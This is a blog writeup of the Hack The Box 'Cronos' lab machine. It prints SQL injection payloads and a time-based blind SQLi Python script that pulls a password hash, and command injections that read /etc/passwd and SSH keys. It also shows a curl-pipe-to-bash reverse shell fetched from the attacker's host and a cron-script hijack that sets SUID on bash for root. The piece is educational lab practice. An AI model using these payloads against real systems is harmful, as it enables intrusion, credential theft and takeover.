---
layout: post
title:  "Cronos Writeup - Hack The Box"
date:   2025-05-14
desc: ""
keywords: "HTB,eWPT,eWPTXv2,OSWE,OSCP,Linux,AXFR,SQLi,Scripting,Command Injection,Cron Job,Medium"
categories: [HTB]
tags: [HTB,eWPT,eWPTXv2,OSWE,OSCP,Linux,AXFR,SQLi,Scripting,Command Injection,Cron Job,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I start my practice in the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform and I choose as a laboratory and as a target the **Cronos** machine, it has a medium difficulty and the truth is that both the **Engagement** and **Privilege Escalation** phase have a **Medium** complexity, but always depending on the knowledge that one has. It took me a long time to compromise the box, because I had to apply old methods and enumerate a lot but I had a lot of fun because you can follow different paths. I just have to spawn the machine and that rewarding learning experience is guaranteed with the lab to engage.

<br /><br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I already know the steps I need to follow so that I don't waste unnecessary time in the lab **Engagement**, but that doesn't mean I don't make mistakes and have to try different methods and attacks that don't work, but apply the wrong techniques or don't understand the vulnerability to exploit. I start my ***Reconnaissance** phase, for this I use `ping` to make sure I am connected to the lab, then with a custom script created by the **[hack4u](https://hack4u.io/){:target="_blank"}** community, `whichSystem.py`, I can get an idea of the Operating System of the box. Finally with `nmap` I leak information of the ports, their services and versions to think about the attack surface, it also allows me to get the **Codename** in **Launchpad** and if I get different values it is very likely that containers are being implemented, in this case it seems not.

```bash
ping -c 1 10.10.10.13
whichSystem.py 10.10.10.13
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.13 -oG allPorts
nmap -sCV -p22,53,80 10.10.10.13 -oN targeted
#    --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
#    google.es --> OpenSSH 7.2p2 4ubuntu2.1 launchpad    Xenial
#    --> Apache httpd 2.4.18
#    google.es --> Apache httpd 2.4.18 launchpad         Xenial
```

<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since port **53** with the standard **Domain Name System** (**DNS**) is available, I use `dig` to get information that does not help me much. With `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I have no luck either if I analyze the **HTTP** service on port **80**, I find no information that allows me to glimpse a possible attack vector. With `nmap` and `wfuzz` I perform an enumeration of possible hidden paths or directories, but the results are not successful, so I go back to the beginning and search with `nslookup` for more information about the **DNS** and this time I leak information about the domain that is being implemented (**the typical HTB one**). I modify my **hosts** file, so that my machine resolves well when accessing from the browser, this time **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** already shows me more interesting information about the technologies used in the web service, in the source code I don't find much.

```bash
dig @10.10.10.13
dig @10.10.10.13 ns
dig @10.10.10.13 mx
dig @10.10.10.13 axfr
# :(

whatweb http://10.10.10.13/
# http://10.10.10.13/

nmap --script http-enum -p80 10.10.10.13 -oN webScan
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.13/FUZZ

nslookup
  server 10.10.10.13
  10.10.10.13

nvim /etc/hosts
cat /etc/hosts | tail -n 2
ping -c 1 cronos.htb

# http://cronos.htb/
```

<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/cronos_writeup/Cronos_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now if I search with `wfuzz` for hidden directories but using the domain I just found, I find some paths and files but nothing interesting at the moment. As it seems **Virtual Hosting** is being implemented, I am going to use `dig` again but in addition to the **IP** I use the domain to get the **Nameservers**, and I find a subdomain. With `wfuzz` I also find the subdomain but it is a more invasive technique and in a pentesting job it might not be recommended to use, I had already made a mistake before when instead of using `dnslookup` first, I started directly with `wfuzz`. Now **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** gives me a little more information about the new web service that is available, as it happens to be an authentication panel I try default credentials, which unfortunately do not work.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://cronos.htb/FUZZ
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-html-php http://cronos.htb/FUZZ.FUZ2Z

dig @10.10.10.13 cronos.htb
dig @10.10.10.13 cronos.htb ns
dig @10.10.10.13 cronos.htb mx
dig @10.10.10.13 cronos.htb axfr

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.cronos.htb' http://10.10.10.13
wfuzz -c --hc=404 --hh=11439 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.cronos.htb' http://10.10.10.13

nvim /etc/hosts
cat /etc/hosts | tail -n 2
ping -c 1 admin.cronos.htb

# http://admin.cronos.htb/
# admin:admin       :( Defatult credentials
```

<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As I'm in front of an authentication panel, plus **PHP** is being used as programming language, it is very likely that a **MySQL Database Management System** is being used, so I can try some injections to check if the web service is vulnerable to **[SQL injections](https://portswigger.net/web-security/sql-injection){:target="_blank"}**. Indeed it is, so I can continue with the tests to bypass the authentication panel or leak sensitive information.

```sql
# http://admin.cronos.htb/
'                           '                             # :(
admin                       admin' and sleep(5)-- -       # :(
' or sleep(5)-- -           admin                         # :)
admin' and sleep(5)-- -     admin                         # :(
admin' or sleep(5)-- -      admin                         # :) :0
admin' or 1=1-- -           admin                         # :)
```

<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before continuing with the **Engagement** of the box, and together with the **[hack4u](https://hack4u.io/){:target="_blank"}** community we were able to make a script to automate the **SQLi** exploit. First we had to analyze the source code and the requests sent to the server at the time of authentication, so verify the names of the parameters to create a **Python** script and know where to perform the injection, which is of the **[Blind Time Based](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval){:target="_blank"}** type. The first thing I do is to get the name of the **Database**, then leak the names of the existing **tables** in the DB, then the names of the **columns** and finally the **password** (which happens to be a hash) of the only user that exists (**admin**). I don't succeed in cracking the hash neither in **[MD5Online](https://www.md5online.org/md5-decrypt.html){:target="_blank"}** or **[MD5 Encrypt/Decrypt](https://10015.io/tools/md5-encrypt-decrypt){:target="_blank"}** and one could think that so much effort was useless but this is what growing in this field is all about, taking advantage to improve the skills with each lab.

```bash
nvim sqli.py
```

> **sqli.py**:

```python
#!/usr/bin/python3

from pwn import *
import signal, time, requests, string, pdb

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables
admin_url = "http://admin.cronos.htb/index.php"
characters = string.ascii_lowercase

def makeRequest():

    p1 = log.progress("SQLi")
    p1.status("Initiating brute force attack")

    p2 = log.progress("Databases Leak")

    time.sleep(2)

    database = ""
    for position in range(1, 10):
        for character in characters:
            post_data = {
                'username': "admin' and if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (position, character),
                'password': 'admin'
            }

            p1.status(post_data['username'])
            time_start = time.time()
            r = requests.post(admin_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 5:
                database += character
                p2.status(database)
                break

if __name__ == "__main__":

    makeRequest()
```

```bash
python3 sqli.py
# ModuleNotFoundError: No module named 'pwn'

sudo pip3 install pwntools

python3 -m venv ./
./bin/python3 ./bin/pip3 install pwntools
./bin/python3 sqli.py
# [*] Databases Leak: admin

nvim sqli.py
```

> **sqli.py**:

```python
#!/usr/bin/python3

from pwn import *
import signal, time, requests, string, pdb

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables
admin_url = "http://admin.cronos.htb/index.php"
characters = string.ascii_lowercase

def makeRequest():

    p1 = log.progress("SQLi")
    p1.status("Initiating brute force attack")

    p2 = log.progress("Tables Leak")

    time.sleep(2)

    tables = ""
    for table in range(0, 5):
        for position in range(1, 10):
            for character in characters:
                post_data = {
                    'username': "admin' and if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (table, position, character),
                    'password': 'admin'
                }

#                p1.status(post_data['username'])
                time_start = time.time()
                r = requests.post(admin_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    tables += character
                    p2.status(tables)
                    break
        tables += ", "

if __name__ == "__main__":

    makeRequest()
```

```bash
./bin/python3 sqli.py
# [◒] Tables Leak: users

nvim sqli.py
```

> **sqli.py**:

```python
#!/usr/bin/python3

from pwn import *
import signal, time, requests, string, pdb

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables
admin_url = "http://admin.cronos.htb/index.php"
characters = string.ascii_lowercase

def makeRequest():

    p1 = log.progress("SQLi")
    p1.status("Initiating brute force attack")

    p2 = log.progress("Columns Leakage")

    time.sleep(2)

    columns = ""
    for column in range(0, 5):
        for position in range(1, 10):
            for character in characters:
                post_data = {
                    'username': "admin' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (column, position, character),
                    'password': 'admin'
                }

#                p1.status(post_data['username'])
                time_start = time.time()
                r = requests.post(admin_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    columns += character
                    p2.status(columns)
                    break
        columns += ", "

if __name__ == "__main__":

    makeRequest()
```

```bash
./bin/python3 sqli.py
# [┴] Columns Leakage: id, username, password

nvim sqli.py
```

> **sqli.py**:

```python
#!/usr/bin/python3

from pwn import *
import signal, time, requests, string, pdb

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables
admin_url = "http://admin.cronos.htb/index.php"
characters = string.ascii_lowercase + string.digits

def makeRequest():

    p1 = log.progress("SQLi")
    p1.status("Initiating brute force attack")

    p2 = log.progress("Information Leakage")

    time.sleep(2)

    data = ""
    for position in range(1, 50):
        for character in characters:
            post_data = {
                'username': "admin' and if(substr((select group_concat(password) from users),%d,1)='%c',sleep(3),1)-- -" % (position, character),
                'password': 'admin'
            }

            p1.status(post_data['username'])
            time_start = time.time()
            r = requests.post(admin_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 3:
                data += character
                p2.status(data)
                break

if __name__ == "__main__":

    makeRequest()
```

```bash
./bin/python3 sqli.py
```

<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

It is not necessary to create the tool, since it can be bypassed with the injection, but the automation of the attack is a great opportunity to practice scripting. After accessing the administration panel, there is implemented software related to networking, but also with two options that are typical **Linux** programs (`traceroute` and `ping`). I can get a trace on my machine with `tcpdump`, which makes me think that a Linux command is being executed. If I concatenate another command, I can get the result in the browser, so I can start enumerating the system without inconvenience, even see the content of the first flag.

```bash
# http://admin.cronos.htb/welcome.php

tcpdump -i tun0 icmp -n
# ping  10.10.14.22       :)

# 8.8.8.8;whoami          :)
# 8.8.8.8;hostname
# 8.8.8.8;ifconfig
# 8.8.8.8;ls
# 8.8.8.8;cat /etc/passwd
# 8.8.8.8;cat /home/noulis/user.txt
# 8.8.8.8;cat /home/noulis/.ssh/id_rsa      :(
```

<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now to access the target machine, I just need to create an **index.html** file with a malicious command I get from **[pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** to get a **Reverse Shell**, then mount a local server with `python` to make the file accessible, open a local port with `nc` to establish the connection to the victim machine and finally inject the command in my browser to compromise the machine. Everything works correctly, so now I perform a **Console treatment** to have a more efficient performance from console. I find some credentials to access the database manager and again I can see the content of the first flag.

```bash
python3 -m http.server 80
# 8.8.8.8;curl 10.10.14.22                  :)

nvim index.html
cat !$
python3 -m http.server 80
nc -nlvp 443
# 8.8.8.8;curl 10.10.14.22|bash             :)

whoami
hostname
hostname -I
ip a

# Console treatment
script /dev/null -c bash
[Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once I get a **Shell** from the victim machine, perform my basic enumeration commands, I find that **Polkit's** `pkexec` tool has **SUID** permissions which probably makes it vulnerable to **[PwnKit](https://github.com/ly4k/PwnKit){:target="_blank"}**, but that is not the intended path. I also find no relevant information in the Database, but I do find a **Cron job** that runs every minute and it is the **root** user who set it up (hence the machine name, which turns out to be a clue). The scheduled task runs a script with `php`, and the user with which I accessed the machine is the owner of it, so I can think of an attack vector to **Escalate privileges**.

```bash
id
groups
find \-perm -4000 2>/dev/null
# ./usr/bin/pkexec          Not intended path!

getcap / -r 2>/dev/null
sudo -l
cat /etc/passwd | grep 'sh$'
su noulis

mysql -uadmin -p
  show databases;
  use admin;
  show tables;
  describe users;
  select * from users;
  quit;

crontab -l
cat /etc/crontab
# * * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

ls -l /var/www/laravel/artisan
file /var/www/laravel/artisan
# php script
ps -fawx | grep -iE 'php|artisan'
```

<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I will create a script to check that the task is running in background, and after giving it permissions to run, I just have to wait a little while to find the task, which is indeed scheduled by the **root** user. I can also resort to **[Dominic Breuker's](https://github.com/DominicBreuker/pspy){:target="_blank"}** `pspy` tool, compile it, chrompress it and transfer it to the **Cronos** machine to run it but it doesn't work because of version problem. So I use a deprecated version that does run on this machine and find the scheduled task again.

> **Victime Machine**:

```bash
touch procmon.sh
chmod +x !$
nano !$
cat !$
```

> **procmon.sh**:

```bash
#!/bin/bash

function ctrl_c():
	echo -e "\n\n[!] Exiting ...\n"
	tput cnorm; exit 1

# Ctrl+c
trap ctrl_c INT

tput civis

old_process=$(ps -eo user,command)

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[>,<]" | grep -vE "kworker|procmon|command"
	old_process=$new_process
done
tput cnorm
```

> **Victime Machine**:

```bash
./procmon.sh
# > root     /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

> **Attacker Machine**:

```bash
git clone https://github.com/DominicBreuker/pspy
go build -ldflags '-s -w' .
du -hc pspy

upx pspy
du -hc pspy
python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget http://10.10.14.22/pspy
md5sum pspy
```

> **Attacker Machine**:

```bash
md5sum pspy
```

> **Victime Machine**:

```bash
chmod +x pspy
./pspy
# :( Version problem
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/pspy64 ./pspy
python3 -m http.server 80
```

> **Victime Machine**:

```bash
rm pspy
wget http://10.10.14.22/pspy
chmod +x pspy
./pspy
```

<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/cronos_writeup/Cronos_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The steps to **Escalate privileges** are not very complex to perform, I just have to delete the file that runs in the scheduled task and replace it with one that executes a malicious command, in this case I will enable the **SUID** bit to the `bash` **Shell** so that when executed with the **-p** parameter it preserves the permissions of the owner user and can escalate privileges. After waiting a few seconds, the change is done and I can get a **Shell** with the **root** user and access the last flag.

```bash
rm artisan
nano !$
cat !$
watch -n 1 ls -l /bin/bash

bash -p
```

<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> It was a great experience to successfully engage this **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab, the machine is perfect to understand different vulnerabilities and multiple attack vectors, you can also create tools to automate tasks and polish your scripting skills. I continue with my hype to face the available labs, so I'm going to kill this box and look for the new challenge.

<br /><br />
<img src="{{ site.img_path }}/cronos_writeup/Cronos_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
